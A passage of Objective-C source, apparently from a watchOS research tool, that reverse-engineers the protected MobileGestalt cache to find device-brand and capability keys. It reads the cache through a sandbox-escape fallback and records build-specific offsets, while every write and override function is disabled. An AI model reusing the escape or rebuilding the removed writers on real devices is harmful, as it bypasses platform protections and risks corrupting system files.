    return [[NSFileManager defaultManager] fileExistsAtPath:BQBackupPath()];
}

NSString *BQMobileGestaltPath(void) {
    return [kMGCaches stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
}

BOOL BQInPlaceWrite(void) {
    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:@"BQInPlaceWrite"];
    return n ? n.boolValue : YES;
}

void BQSetInPlaceWrite(BOOL on) {
    [[NSUserDefaults standardUserDefaults] setBool:on forKey:@"BQInPlaceWrite"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    BQLog(@"in-place write = %d", on);
}

// RO23: bq_write_all removed from research-only public snapshot.


// RO23: bq_write_data removed; all MobileGestalt writes are blocked.



// MG V5 READONLY: inspect an unverified candidate layout.
// This function never modifies the source file or the plist.
static void BQInspectDeviceBrandV5(NSDictionary *plist) {
    NSData *data = plist[@"CacheData"];
    NSString *uuid = plist[@"CacheUUID"];
    NSDictionary *extra = plist[@"CacheExtra"];

    if (![data isKindOfClass:[NSData class]] ||
        ![uuid isKindOfClass:[NSString class]] ||
        ![extra isKindOfClass:[NSDictionary class]]) {
        BQLog(@"MG V5 READONLY: INVALID STRUCTURE");
        return;
    }

    // Reference offsets: supported watchOS 26.6 build 23U67.
    // These are NOT verified for watchOS 26.5 or 26.6.1.
    const NSUInteger valueOffset = 0x338;
    const NSUInteger presentOffset = 0x164F;
    const NSUInteger slotSize = 8;

    BOOL lengthMatches = (data.length == 0x18A5);
    BOOL uuidMatches = [uuid isEqualToString:
        @"A4C66635-ED53-4978-87E5-943E7429FCF2"];

    BQLog(@"MG V5 READONLY: UUID=%@ CacheData=%lu",
          uuid, (unsigned long)data.length);

    BQLog(@"MG V5 REFERENCE 23U67: lengthMatch=%@ uuidMatch=%@",
          lengthMatches ? @"YES" : @"NO",
          uuidMatches ? @"YES" : @"NO");

    if (data.length < valueOffset + slotSize ||
        data.length <= presentOffset) {
        BQLog(@"MG V5: candidate offsets out of range");
        return;
    }

    const unsigned char *bytes = data.bytes;

    uint32_t candidate =
        (uint32_t)bytes[valueOffset] |
        ((uint32_t)bytes[valueOffset + 1] << 8) |
        ((uint32_t)bytes[valueOffset + 2] << 16) |
        ((uint32_t)bytes[valueOffset + 3] << 24);

    NSMutableString *hex = [NSMutableString string];

    for (NSUInteger i = 0; i < slotSize; i++) {
        [hex appendFormat:@"%02X", bytes[valueOffset + i]];
    }

    id brandOverride = extra[@"fuKL2rMywRgQF1wowOA/cg"];

    BQLog(@"MG V5 CANDIDATE: offset=0x338 raw=%@ value=%u",
          hex, (unsigned)candidate);

    BQLog(@"MG V5 CANDIDATE: presentOffset=0x164F byte=%u",
          (unsigned)bytes[presentOffset]);

    BQLog(@"MG V5 CANDIDATE: CacheExtra brandOverride=%@",
          brandOverride ? @"PRESENT" : @"ABSENT");

    BQLog(@"MG V5 RESULT: candidate only; not a verified layout. NO WRITES.");
}


// V6: runtime MobileGestalt descriptor analysis, read-only.

// V6.4: read-only Mach-O section parser for arm64_32 and arm64.
static BOOL BQMGSectionV64(
    const struct mach_header *h,
    intptr_t slide,
    const char *segmentName,
    const char *sectionName,
    const uint8_t **outBytes,
    size_t *outSize
) {
    if (!h || !outBytes || !outSize) return NO;

    BOOL wide = h->magic == MH_MAGIC_64;
    if (!wide && h->magic != MH_MAGIC) return NO;

    if (h->ncmds == 0 || h->ncmds > 4096 ||
        h->sizeofcmds > 1024 * 1024) return NO;

    const uint8_t *cursor = (const uint8_t *)h +
        (wide ? sizeof(struct mach_header_64)
              : sizeof(struct mach_header));

    size_t remaining = h->sizeofcmds;

    for (uint32_t i = 0; i < h->ncmds; i++) {
        if (remaining < sizeof(struct load_command))
            return NO;

        struct load_command command;
        memcpy(&command, cursor, sizeof(command));

        if (command.cmdsize < sizeof(command) ||
            command.cmdsize > remaining) return NO;

        uint64_t address = 0;
        uint64_t length = 0;

        if (!wide && command.cmd == LC_SEGMENT &&
            command.cmdsize >= sizeof(struct segment_command)) {

            struct segment_command seg;
            memcpy(&seg, cursor, sizeof(seg));

            if (strncmp(seg.segname, segmentName, 16) == 0 &&
                seg.nsects <= (command.cmdsize - sizeof(seg)) /
                              sizeof(struct section)) {

                for (uint32_t j = 0; j < seg.nsects; j++) {
                    struct section sec;
                    memcpy(&sec,
                           cursor + sizeof(seg) +
                           j * sizeof(sec),
                           sizeof(sec));

                    if (strncmp(sec.sectname, sectionName, 16) == 0) {
                        address = sec.addr;
                        length = sec.size;
                        break;
                    }
                }
            }
        } else if (wide && command.cmd == LC_SEGMENT_64 &&
                   command.cmdsize >= sizeof(struct segment_command_64)) {

            struct segment_command_64 seg;
            memcpy(&seg, cursor, sizeof(seg));

            if (strncmp(seg.segname, segmentName, 16) == 0 &&
                seg.nsects <= (command.cmdsize - sizeof(seg)) /
                              sizeof(struct section_64)) {

                for (uint32_t j = 0; j < seg.nsects; j++) {
                    struct section_64 sec;
                    memcpy(&sec,
                           cursor + sizeof(seg) +
                           j * sizeof(sec),
                           sizeof(sec));

                    if (strncmp(sec.sectname, sectionName, 16) == 0) {
                        address = sec.addr;
                        length = sec.size;
                        break;
                    }
                }
            }
        }

        if (length != 0) {
            if (length > 32 * 1024 * 1024) return NO;

            int64_t mapped = (int64_t)address + (int64_t)slide;
            if (mapped <= 0 ||
                (uint64_t)mapped > UINTPTR_MAX) return NO;

            *outBytes = (const uint8_t *)(uintptr_t)mapped;
            *outSize = (size_t)length;
            return YES;
        }

        cursor += command.cmdsize;
        remaining -= command.cmdsize;
    }

    return NO;
}

static void BQRuntimeDeviceBrandProbeV6(NSDictionary *plist) {
    NSData *cache = plist[@"CacheData"];
    NSString *uuid = plist[@"CacheUUID"];

    if (![cache isKindOfClass:[NSData class]] ||
        ![uuid isKindOfClass:[NSString class]] ||
        !cache.length || cache.length % 9 != 0) {
        BQLog(@"MG V6.4: invalid cache");
        return;
    }

    NSUInteger slots = cache.length / 9;
    if (slots > 16384) return;

    // Use dyld's image list; do not assume a 64-bit Mach-O header.
    const struct mach_header *header = NULL;
    intptr_t slide = 0;

    for (uint32_t i = 0; i < _dyld_image_count(); i++) {
        const char *name = _dyld_get_image_name(i);
        if (!name || !strstr(name, "libMobileGestalt.dylib"))
            continue;

        const struct mach_header *candidate =
            _dyld_get_image_header(i);

        if (!candidate) continue;

        if (candidate->magic == MH_MAGIC ||
            candidate->magic == MH_MAGIC_64) {
            header = candidate;
            slide = _dyld_get_image_vmaddr_slide(i);
            break;
        }
    }

    if (!header) {
        BQLog(@"MG V6.4: Mach-O image unavailable");
        return;
    }

    BOOL wide = header->magic == MH_MAGIC_64;
    size_t pointerSize = wide ? 8 : 4;

    BQLog(@"MG V6.4: Mach-O magic=0x%08X cpu=0x%X pointerSize=%lu",
          header->magic, (unsigned)header->cputype,
          (unsigned long)pointerSize);

    BQLog(@"MG V6.4: CacheUUID=%@ slots=%lu",
          uuid, (unsigned long)slots);

    const uint8_t *strings = NULL;
    size_t stringSize = 0;

    if (!BQMGSectionV64(header, slide, "__TEXT", "__cstring",
                        &strings, &stringSize)) {
        BQLog(@"MG V6.4: __cstring section unavailable");
        return;
    }

    const char *target = "fuKL2rMywRgQF1wowOA/cg";
    uintptr_t targetAddress = 0;
    NSUInteger keyHits = 0;

    for (size_t i = 0; i + 22 < stringSize; i++) {
        if ((i == 0 || strings[i - 1] == 0) &&
            strings[i + 22] == 0 &&
            memcmp(strings + i, target, 22) == 0) {

            targetAddress = (uintptr_t)(strings + i);
            keyHits++;
        }
    }

    BQLog(@"MG V6.4: cstringBytes=%lu DeviceBrandKeyHits=%lu",
          (unsigned long)stringSize,
          (unsigned long)keyHits);

    if (keyHits != 1) {
        BQLog(@"MG V6.4 RESULT: KEY NOT UNIQUE OR ABSENT. NO WRITES.");
        return;
    }

    BQLog(@"MG V6.4: keyAddress=%p",
          (void *)targetAddress);

    const char *segments[] = {
        "__AUTH_CONST", "__DATA_CONST",
        "__DATA", "__AUTH", "__TEXT"
    };

    NSUInteger matches = 0;
    NSUInteger scanned = 0;

    for (size_t part = 0; part < 5; part++) {
        const uint8_t *sectionBytes = NULL;
        size_t sectionSize = 0;

        if (!BQMGSectionV64(header, slide,
                            segments[part], "__const",
                            &sectionBytes, &sectionSize))
            continue;

        scanned++;

        for (size_t offset = 0;
             offset + pointerSize <= sectionSize;
             offset += pointerSize) {

            uint64_t pointer = 0;
            memcpy(&pointer, sectionBytes + offset, pointerSize);

            if (pointer != (uint64_t)targetAddress)
                continue;

            matches++;

            if (matches <= 8) {
                size_t available = sectionSize - offset;
                size_t length = available < 48 ? available : 48;

                NSMutableString *hex =
                    [NSMutableString stringWithCapacity:length * 2];

                for (size_t j = 0; j < length; j++)
                    [hex appendFormat:@"%02X",
                     (unsigned)sectionBytes[offset + j]];

                BQLog(@"MG V6.4 REF: %s+0x%lX bytes=%@",
                      segments[part],
                      (unsigned long)offset, hex);

                // V6.6: test 64-byte descriptor alignment.
                // Hypothesis only. All accesses are read-only.
                if (pointerSize == 4 && stringSize >= 23) {
                    for (int relative = -2; relative <= 2; relative++) {
                        int64_t start =
                            (int64_t)offset + (int64_t)relative * 64;

                        if (start < 0 ||
                            (uint64_t)start + 64 > sectionSize)
                            continue;

                        const uint8_t *record =
                            sectionBytes + (size_t)start;

                        uint32_t keyPointer = 0;
                        int16_t index = -1;
                        uint32_t type = 0;

                        memcpy(&keyPointer, record, 4);
                        memcpy(&index, record + 0x3A, 2);
                        memcpy(&type, record + 0x3C, 4);

                        NSString *hash = @"NOT A KEY POINTER";
                        uint64_t base = (uint64_t)(uintptr_t)strings;

                        if ((uint64_t)keyPointer >= base) {
                            uint64_t delta =
                                (uint64_t)keyPointer - base;

                            if (delta <= (uint64_t)stringSize - 23) {
                                const uint8_t *keyBytes =
                                    strings + (size_t)delta;

                                if (keyBytes[22] == 0) {
                                    BOOL valid = YES;

                                    for (int k = 0; k < 22; k++) {
                                        uint8_t c = keyBytes[k];

                                        if (!((c >= 'A' && c <= 'Z') ||
                                              (c >= 'a' && c <= 'z') ||
                                              (c >= '0' && c <= '9') ||
                                              c == '+' || c == '/')) {
                                            valid = NO;
                                            break;
                                        }
                                    }

                                    if (valid) {
                                        NSString *candidate =
                                            [[NSString alloc]
                                             initWithBytes:keyBytes
                                             length:22
                                             encoding:NSUTF8StringEncoding];

                                        if (candidate) hash = candidate;
                                    }
                                }
                            }
                        }

                        BOOL plausible =
                            ![hash isEqualToString:@"NOT A KEY POINTER"] &&
                            index >= -1 &&
                            index < (NSInteger)slots &&
                            type >= 1 && type <= 11;

                        BQLog(
                          @"MG V6.6 ROW: relative=%+d sectionOffset=0x%lX key=%@ index=%d type=%u plausible=%@",
                          relative,
                          (unsigned long)start,
                          hash, (int)index, (unsigned)type,
                          plausible ? @"YES" : @"NO");
                    }

                    const NSUInteger candidates[] = {103, 206};

                    for (NSUInteger i = 0; i < 2; i++) {
                        NSUInteger index = candidates[i];
                        NSUInteger valueOffset = index * 8;
                        NSUInteger presentOffset = slots * 8 + index;

                        if (valueOffset + 8 > cache.length ||
                            presentOffset >= cache.length)
                            continue;

                        const uint8_t *cacheBytes = cache.bytes;
                        uint64_t rawValue = 0;

                        memcpy(&rawValue,
                               cacheBytes + valueOffset, 8);

                        BQLog(
                          @"MG V6.6 SAMPLE: index=%lu raw=0x%016llX present=%u",
                          (unsigned long)index,
                          (unsigned long long)rawValue,
                          (unsigned)cacheBytes[presentOffset]);
                    }
                }


                // V6.5: inspect neighboring bytes, read-only.
                size_t begin = offset >= 48 ? offset - 48 : 0;
                size_t finish = sectionSize - offset >= 64
                    ? offset + 64 : sectionSize;

                NSMutableString *context = [NSMutableString string];

                for (size_t k = begin; k < finish; k += 4) {
                    if (k == offset)
                        [context appendString:@" <TARGET> "];

                    [context appendString:@" "];

                    for (size_t j = k; j < k + 4 && j < finish; j++) {
                        [context appendFormat:@"%02X", sectionBytes[j]];
                    }
                }

                BQLog(@"MG V6.5: contextStart=0x%lX target=0x%lX",
                      (unsigned long)begin,
                      (unsigned long)offset);

                BQLog(@"MG V6.5 CONTEXT:%@", context);

                if (offset + 8 <= sectionSize) {
                    uint32_t nextValue = 0;
                    memcpy(&nextValue, sectionBytes + offset + 4, 4);

                    Dl_info nextInfo = {0};
                    int found = dladdr(
                        (const void *)(uintptr_t)nextValue,
                        &nextInfo);

                    BQLog(@"MG V6.5: secondWord=0x%08X image=%s symbol=%s",
                          nextValue,
                          found && nextInfo.dli_fname
                            ? nextInfo.dli_fname : "unknown",
                          found && nextInfo.dli_sname
                            ? nextInfo.dli_sname : "unknown");
                }

            }
        }
    }


    // V6.7: compare candidate descriptor offsets across keys.
    // Read-only. No offsets are approved for writing.
    if (pointerSize == 4 && stringSize >= 23) {
        const char *testSegments[] = {
            "__DATA_CONST", "__AUTH_CONST", "__DATA"
        };

        NSMutableSet<NSString *> *seen =
            [NSMutableSet set];

        NSUInteger controls = 0;
        NSUInteger valid3A = 0, valid9A = 0;
        NSUInteger targetCount = 0;

        uint64_t stringBase = (uint64_t)(uintptr_t)strings;

        for (NSUInteger part = 0; part < 3; part++) {
            const uint8_t *sectionBytes = NULL;
            size_t sectionSize = 0;

            if (!BQMGSectionV64(
                    header, slide, testSegments[part],
                    "__const", &sectionBytes, &sectionSize))
                continue;

            for (size_t offset = 0;
                 offset + 0xA0 <= sectionSize;
                 offset += 4) {

                uint32_t pointer = 0;
                memcpy(&pointer, sectionBytes + offset, 4);

                uint64_t address = pointer;

                if (address < stringBase ||
                    address - stringBase >
                        (uint64_t)stringSize - 23)
                    continue;

                size_t pos = (size_t)(address - stringBase);

                if ((pos && strings[pos - 1] != 0) ||
                    strings[pos + 22] != 0)
                    continue;

                BOOL validKey = YES;
                for (size_t j = 0; j < 22; j++) {
                    uint8_t c = strings[pos + j];

                    if (!((c >= 'A' && c <= 'Z') ||
                          (c >= 'a' && c <= 'z') ||
                          (c >= '0' && c <= '9') ||
                          c == '+' || c == '/')) {
                        validKey = NO;
                        break;
                    }
                }

                if (!validKey) continue;

                NSString *key = [[NSString alloc]
                    initWithBytes:strings + pos
                    length:22
                    encoding:NSUTF8StringEncoding];

                if (!key || [seen containsObject:key])
                    continue;

                [seen addObject:key];

                int16_t index3A = 0, index9A = 0;
                uint32_t type3C = 0, type9C = 0;

                memcpy(&index3A,
                       sectionBytes + offset + 0x3A, 2);
                memcpy(&type3C,
                       sectionBytes + offset + 0x3C, 4);

                memcpy(&index9A,
                       sectionBytes + offset + 0x9A, 2);
                memcpy(&type9C,
                       sectionBytes + offset + 0x9C, 4);

                BOOL plausible3A =
                    index3A >= 0 &&
                    (NSUInteger)index3A < slots &&
                    type3C >= 1 && type3C <= 11;

                BOOL plausible9A =
                    index9A >= 0 &&
                    (NSUInteger)index9A < slots &&
                    type9C >= 1 && type9C <= 11;

                BOOL isTarget =
                    [key isEqualToString:
                     @"fuKL2rMywRgQF1wowOA/cg"];

                if (isTarget) {
                    targetCount++;

                    BQLog(
                      @"MG V6.7 TARGET: section=%s offset=0x%lX",
                      testSegments[part],
                      (unsigned long)offset);

                    BQLog(
                      @"MG V6.7 TARGET: +3A index=%d type=%u valid=%@",
                      (int)index3A, (unsigned)type3C,
                      plausible3A ? @"YES" : @"NO");

                    BQLog(
                      @"MG V6.7 TARGET: +9A index=%d type=%u valid=%@",
                      (int)index9A, (unsigned)type9C,
                      plausible9A ? @"YES" : @"NO");
                } else {
                    controls++;

                    if (plausible3A) valid3A++;
                    if (plausible9A) valid9A++;

                    if (controls <= 8) {
                        BQLog(
                          @"MG V6.7 CONTROL: key=%@ +3A=%d/%u +9A=%d/%u",
                          key,
                          (int)index3A, (unsigned)type3C,
                          (int)index9A, (unsigned)type9C);
                    }
                }
            }
        }

        BQLog(
          @"MG V6.7 SUMMARY: target=%lu controls=%lu valid3A=%lu valid9A=%lu",
          (unsigned long)targetCount,
          (unsigned long)controls,
          (unsigned long)valid3A,
          (unsigned long)valid9A);

        BQLog(
          @"MG V6.7 RESULT: CANDIDATE LAYOUTS ONLY. NO WRITES.");
    }


    // V6.8: test metadata preceding 32-bit key references.
    // Read-only statistical analysis, not a verified layout.
    if (pointerSize == 4 && stringSize >= 23) {
        const char *names[] = {
            "__DATA_CONST", "__AUTH_CONST", "__DATA"
        };

        NSMutableSet<NSString *> *seen =
            [NSMutableSet set];
        NSMutableIndexSet *uniqueIndices =
            [NSMutableIndexSet indexSet];

        NSUInteger controls = 0;
        NSUInteger validControls = 0;
        NSUInteger flag13Controls = 0;
        NSUInteger targetHits = 0;
        NSUInteger resolvedBrandIndex = NSNotFound;

        uint64_t stringBase =
            (uint64_t)(uintptr_t)strings;

        for (NSUInteger part = 0; part < 3; part++) {
            const uint8_t *data = NULL;
            size_t length = 0;

            if (!BQMGSectionV64(
                    header, slide, names[part],
                    "__const", &data, &length))
                continue;

            for (size_t off = 8;
                 off + 4 <= length;
                 off += 4) {

                uint32_t ptr = 0;
                memcpy(&ptr, data + off, 4);

                if ((uint64_t)ptr < stringBase)
                    continue;

                uint64_t delta =
                    (uint64_t)ptr - stringBase;

                if (delta > (uint64_t)stringSize - 23)
                    continue;

                size_t pos = (size_t)delta;

                if ((pos && strings[pos - 1] != 0) ||
                    strings[pos + 22] != 0)
                    continue;

                BOOL validKey = YES;

                for (NSUInteger i = 0; i < 22; i++) {
                    uint8_t c = strings[pos + i];

                    if (!((c >= 'A' && c <= 'Z') ||
                          (c >= 'a' && c <= 'z') ||
                          (c >= '0' && c <= '9') ||
                          c == '+' || c == '/')) {
                        validKey = NO;
                        break;
                    }
                }

                if (!validKey) continue;

                NSString *key = [[NSString alloc]
                    initWithBytes:strings + pos
                    length:22
                    encoding:NSUTF8StringEncoding];

                if (!key || [seen containsObject:key])
                    continue;

                [seen addObject:key];

                uint16_t flags = 0;
                uint16_t index = 0;
                uint32_t type = 0;

                memcpy(&flags, data + off - 8, 2);
                memcpy(&index, data + off - 6, 2);
                memcpy(&type, data + off - 4, 4);

                BOOL plausible =
                    index < slots &&
                    type >= 1 && type <= 11;

                BOOL target =
                    [key isEqualToString:
                     @"fuKL2rMywRgQF1wowOA/cg"];

                if (target) {
                    targetHits++;
                    if (plausible && flags == 13 && type == 11)
                        resolvedBrandIndex = index;

                    BQLog(
                      @"MG V6.8 TARGET: section=%s ref=0x%lX flags=%u index=%u type=%u plausible=%@",
                      names[part], (unsigned long)off,
                      (unsigned)flags, (unsigned)index,
                      (unsigned)type,
                      plausible ? @"YES" : @"NO");
                } else {
                    controls++;

                    if (plausible) {
                        validControls++;
                        [uniqueIndices addIndex:index];

                        if (flags == 13)
                            flag13Controls++;
                    }

                    if (controls <= 10) {
                        BQLog(
                          @"MG V6.8 CONTROL: flags=%u index=%u type=%u plausible=%@",
                          (unsigned)flags, (unsigned)index,
                          (unsigned)type,
                          plausible ? @"YES" : @"NO");
                    }
                }
            }
        }

        BQLog(
          @"MG V6.8 SUMMARY: target=%lu controls=%lu plausible=%lu uniqueIndices=%lu flag13=%lu",
          (unsigned long)targetHits,
          (unsigned long)controls,
          (unsigned long)validControls,
          (unsigned long)uniqueIndices.count,
          (unsigned long)flag13Controls);


        // V6.9: independent read-only API comparison.
        if (targetHits == 1 &&
            resolvedBrandIndex < slots &&
            cache.length == slots * 9) {

            NSUInteger index = resolvedBrandIndex;
            NSUInteger valueOffset = index * 8;
            NSUInteger presentOffset = slots * 8 + index;

            const uint8_t *bytes = cache.bytes;
            int32_t cachedValue = 0;

            memcpy(&cachedValue, bytes + valueOffset, 4);

            uint8_t present = bytes[presentOffset];

            BQLog(
              @"MG V6.9 CACHE: index=%lu valueOffset=0x%lX presentOffset=0x%lX value=%d present=%u",
              (unsigned long)index,
              (unsigned long)valueOffset,
              (unsigned long)presentOffset,
              cachedValue, (unsigned)present);

            void *lib = dlopen(
                "/usr/lib/libMobileGestalt.dylib",
                RTLD_LAZY | RTLD_LOCAL);

            if (lib) {
                typedef int32_t (*MGReadIntFn)(
                    CFStringRef, int32_t);

                MGReadIntFn readAnswer = (MGReadIntFn)
                    dlsym(lib, "MGGetSInt32Answer");

                if (readAnswer) {
                    int32_t live = readAnswer(
                        CFSTR("DeviceBrand"), INT32_MIN);

                    if (live == INT32_MIN) {
                        BQLog(
                          @"MG V6.9 API: UNAVAILABLE OR NO ANSWER");
                    } else {
                        BQLog(
                          @"MG V6.9 API: live=%d cached=%d match=%@",
                          live, cachedValue,
                          present == 1 && live == cachedValue
                            ? @"YES" : @"NO");
                    }
                } else {
                    BQLog(@"MG V6.9 API: SYMBOL UNAVAILABLE");
                }

                dlclose(lib);
            } else {
                BQLog(@"MG V6.9 API: LIBRARY UNAVAILABLE");
            }

            BQLog(@"MG V6.9 RESULT: READONLY. NO WRITES.");
        } else {
            BQLog(@"MG V6.9: TARGET INDEX NOT UNIQUE OR INVALID");
        }

        BQLog(
          @"MG V6.8 RESULT: PRECEDING METADATA HYPOTHESIS ONLY. NO WRITES.");
    }

    BQLog(@"MG V6.4: sectionsScanned=%lu references=%lu",
          (unsigned long)scanned,
          (unsigned long)matches);

    BQLog(@"MG V6.4 RESULT: READONLY DESCRIPTOR SEARCH COMPLETE. NO WRITES.");
}

NSMutableDictionary *BQLoadGestalt(NSString **err) {

    // MG DIRECT READ V3: read-only access before MCM fallback.
    NSError *directError = nil;
    NSData *directData = [NSData dataWithContentsOfFile:BQMobileGestaltPath()
                                               options:0
                                                 error:&directError];

    if (directData.length > 0) {
        NSError *parseError = nil;
        id parsed = [NSPropertyListSerialization
            propertyListWithData:directData
                         options:NSPropertyListMutableContainersAndLeaves
                          format:NULL
                           error:&parseError];

        if ([parsed isKindOfClass:[NSDictionary class]] &&
            [parsed[@"CacheData"] isKindOfClass:[NSData class]] &&
            [parsed[@"CacheExtra"] isKindOfClass:[NSDictionary class]] &&
            [parsed[@"CacheUUID"] isKindOfClass:[NSString class]]) {

            BQLog(@"MG DIRECT READ V3: SUCCESS, %lu bytes",
                  (unsigned long)directData.length);

            if (!BQBackupExists()) {
                NSError *backupError = nil;
                BOOL saved = [directData writeToFile:BQBackupPath()
                                            options:NSDataWritingAtomic
                                              error:&backupError];
                NSData *verify = saved
                    ? [NSData dataWithContentsOfFile:BQBackupPath()]
                    : nil;

                if (!saved || ![verify isEqualToData:directData]) {
                    BQLog(@"MG DIRECT READ V3: BACKUP FAILED: %@",
                          backupError);
                    if (err) *err = @"Direct read worked, but backup verification failed.";
                    return nil;
                }

                BQLog(@"MG DIRECT READ V3: BACKUP VERIFIED");
            } else {
                BQLog(@"MG DIRECT READ V3: existing backup preserved");
            }


            // MG V4: inspect metadata and test a write-capable
            // file descriptor without writing or changing anything.
            NSData *snapshot = [NSData dataWithContentsOfFile:BQBackupPath()];
            NSData *cacheData = parsed[@"CacheData"];
            BOOL matches = snapshot && [snapshot isEqualToData:directData];

            // RO23: active write-open probe disabled in public build.

            BQLog(@"MG V4 SNAPSHOT: UUID=%@ CacheData=%lu CacheExtra=%lu Backup=%lu MatchesCurrent=%@",
                  parsed[@"CacheUUID"],
                  (unsigned long)cacheData.length,
                  (unsigned long)[parsed[@"CacheExtra"] count],
                  (unsigned long)snapshot.length,
                  matches ? @"YES" : @"NO");

            BQLog(@"MG V4 WRITE HANDLE: SKIPPED in public research build");

            BQInspectDeviceBrandV5((NSDictionary *)parsed);
            BQRuntimeDeviceBrandProbeV6((NSDictionary *)parsed);
            return [parsed mutableCopy];
        }

        BQLog(@"MG DIRECT READ V3: INVALID PLIST: %@", parseError);
    } else {
        BQLog(@"MG DIRECT READ V3: READ FAILED: %@", directError);
    }

    // Fall through to the original MCM access implementation.
    NSString *link = nil;
    int64_t h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return nil;
    }
    NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    NSData *data = [NSData dataWithContentsOfFile:plist];
    NSMutableDictionary *dict = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
    if (data.length && !BQBackupExists()) {
        [data writeToFile:BQBackupPath() atomically:YES];
        BQLog(@"MG backup created (%lu bytes)", (unsigned long)data.length);
    }
    BQEndEscape(h);
    if (!dict) {
        if (err) *err = @"MobileGestalt plist missing or invalid";
        return nil;
    }
    BQLog(@"MG loaded: %lu CacheExtra key(s), %lu byte(s)",
          (unsigned long)[dict[@"CacheExtra"] count], (unsigned long)data.length);
    return dict;
}

// RO23 PUBLIC RESEARCH SNAPSHOT: MobileGestalt writes are intentionally removed.
BOOL BQSaveGestalt(NSDictionary *dict, NSString **err) {
    (void)dict;
    if (err) *err = @"RO23 research build: protected MobileGestalt writes are disabled.";
    BQLog(@"RO23 SAFETY: BQSaveGestalt blocked; no system write attempted");
    return NO;
}

// RO23 PUBLIC RESEARCH SNAPSHOT: a backup is not a license to overwrite live MG.
BOOL BQRestoreGestalt(NSString **err) {
    if (err) *err = @"RO23 research build: restoring the protected cache is disabled.";
    BQLog(@"RO23 SAFETY: BQRestoreGestalt blocked; no system write attempted");
    return NO;
}

typedef struct {
    const char *build;
    const char *cacheUUID;
    NSUInteger dataLength;
    NSUInteger valueOffset;
    NSUInteger presentOffset;
} BQDeviceBrandLayout;

static const BQDeviceBrandLayout kDeviceBrandLayouts[] = {
    {"24S5284h", "DB380F61-0014-418D-9799-876666B459E3", 0x1950, 0x348, 0x16e9},
    {"23U67", "A4C66635-ED53-4978-87E5-943E7429FCF2", 0x18a5, 0x338, 0x164f},
    {"24R364", "6F8372B0-1583-4031-A4BC-A54A18B0DD5A", 0x1947, 0x348, 0x16e1},
    {"24R365", "6F8372B0-1583-4031-A4BC-A54A18B0DD5A", 0x1947, 0x348, 0x16e1},
    {"24S118", "32B4CA84-FBDA-496C-9B79-2101D597158B", 0x1950, 0x348, 0x16e9},
};

// watchOS 26 compatibility diagnostics (safe): diagnostics only, no privilege change.
NSString *BQCompatibilitySummary(void) {
    BOOL initialized = BQCoreInit();
    char buildBuffer[128] = {0};
    size_t size = sizeof(buildBuffer);
    BOOL hasBuild = (sysctlbyname("kern.osversion", buildBuffer, &size, NULL, 0) == 0);
    NSString *build = hasBuild ? [NSString stringWithUTF8String:buildBuffer] : @"unknown";
    NSString *version = [WKInterfaceDevice currentDevice].systemVersion ?: @"unknown";
    NSString *group = BQGroupID() ?: @"(none)";
    BOOL hasGroupContainer = BQGroupRoot().length > 0;
    BOOL verifiedBuild = NO;
    if (hasBuild) {
        for (size_t i = 0; i < sizeof(kDeviceBrandLayouts) / sizeof(kDeviceBrandLayouts[0]); i++) {
            if (strcmp(buildBuffer, kDeviceBrandLayouts[i].build) == 0) {
                verifiedBuild = YES;
                break;
            }
        }
    }
    NSString *layoutStatus = verifiedBuild ? @"configured in source" : @"NOT verified in source";
    NSString *backupStatus = BQBackupVerified() ? @"valid backup present" :
                             (BQBackupExists() ? @"backup file INVALID" : @"no backup yet");
    NSString *knownBuildNote = @"";
    if ([build isEqualToString:@"23T570"]) {
        knownBuildNote = @"\nwatchOS 26.5 recognized; layout not verified.";
    } else if ([build isEqualToString:@"23U95"]) {
        knownBuildNote = @"\nwatchOS 26.6.1 recognized; layout not verified.";
    }
    return [NSString stringWithFormat:
        @"watchOS %@ (build %@)\nCore initialization: %@\nApp Group: %@\nApp Group container: %@\nBackup: %@\nHermes layout: %@%@\nSandbox token: NOT TESTED by diagnostics. If Backup MG reports token=NO (-5), the OS access issue remains.",
        version, build, initialized ? @"OK" : @"FAILED", group,
        hasGroupContainer ? @"available" : @"unavailable", backupStatus,
        layoutStatus, knownBuildNote];
}


// RO23 public snapshot: legacy Geod/23U95 direct writers removed.
// Removed from public RO23 snapshot: historical forced-write experiment.
// DeviceBrand index 206/offset 0x670 was a descriptor-boundary error.


// Removed from public RO23 snapshot: historical forced-write experiment.
// DeviceBrand index 206/offset 0x670 was a descriptor-boundary error.


// The UI and public API deliberately cannot activate an unverified face on 23U95.
BOOL BQEnableHermes(NSString **err) {
    if (err) *err = @"RO23 is research-only; native Hermès activation was not achieved.";
    BQLog(@"RO23 SAFETY: enabling Hermès blocked; no system write attempted");
    return NO;
}

// All state-changing capability overrides are disabled in this public snapshot.
static BOOL bq_enableMGCacheExtraKeys(NSArray<NSString *> *keys, NSString **err) {
    (void)keys;
    if (err) *err = @"RO23 research build: capability overrides are disabled.";
    BQLog(@"RO23 SAFETY: CacheExtra override blocked; no system write attempted");
    return NO;
}

BOOL BQEnableAODSupport(NSString **err) {
    // DeviceSupportsAlwaysOnDisplay is the main capability; ClockKit also
    // reads DeviceSupportsAlwaysOnTime while loading CLKDevice information.
    return bq_enableMGCacheExtraKeys(@[
        @"2OOJf1VhaM7NxfRok3HbWQ", // DeviceSupportsAlwaysOnDisplay
        @"j8/Omm6s1lsmTDFsXjsBfA"  // DeviceSupportsAlwaysOnTime
    ], err);
}

BOOL BQEnableAODSecondsSupport(NSString **err) {
    // Enables the AOD flipbook path used by BacklightServices 1 Hz updates.
    return bq_enableMGCacheExtraKeys(@[
        @"aoJSd/MXk7M40NgXTM6x+g" // DeviceSupportsAlwaysOnDisplayFlipbook
    ], err);
}

BOOL BQEnableActionButton(NSString **err) {
    // NanoCompassWaypoints 27.3b1 implements isUltraDevice() by calling
    // MGGetBoolAnswer("WatchAppButtonCapability"). The CacheExtra hash below
    // is the matching MobileGestalt key hash present in this build.
    return bq_enableMGCacheExtraKeys(@[
        @"FBw/2WrPE2supEKosxxoTw"
    ], err);
}


// NeoSpring from Gester, with UIKit and WebKit accessed dynamically on watchOS.
static id gRespringWebView;
static id gRespringOverlay;

static id bq_send_id(id object, const char *name) {
    return ((id (*)(id, SEL))objc_msgSend)(object, sel_registerName(name));
}

static id bq_key_window(void) {
    Class applicationClass = NSClassFromString(@"UIApplication");
